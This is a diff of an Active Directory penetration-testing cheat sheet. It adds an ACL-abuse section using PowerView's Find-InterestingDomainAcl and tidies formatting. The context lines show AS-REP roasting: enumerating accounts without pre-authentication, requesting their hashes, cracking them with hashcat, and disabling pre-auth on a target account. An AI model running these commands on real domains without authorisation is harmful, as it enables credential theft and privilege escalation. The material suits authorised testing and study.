@@ -134,7 +134,6 @@ Get-DomainUser -PreauthNotRequired -Verbose
 Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 ```
 
-
 #### Request encrypted AS-REP
 ```
 . ./ASREPRoast.ps1
@@ -155,6 +154,7 @@ Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 
 ### Set pre-auth not required
 - With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.
+
 #### Enumerate permissions for group
 ```
 Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
@@ -167,7 +167,16 @@ Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-### MS Exchange
+## ACL
+- It is possible to abuse permissions (ACL's)
+- `ObjectDN` = The object the permissions apply to
+- `ActiveDirectoryRight` == Permissions
+- `IdentityReferenceName` == Object who has the permissions
+```
+Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
+```
+
+## MS Exchange
 - https://github.com/dafthack/MailSniper
 
 #### Enumerate all mailboxes
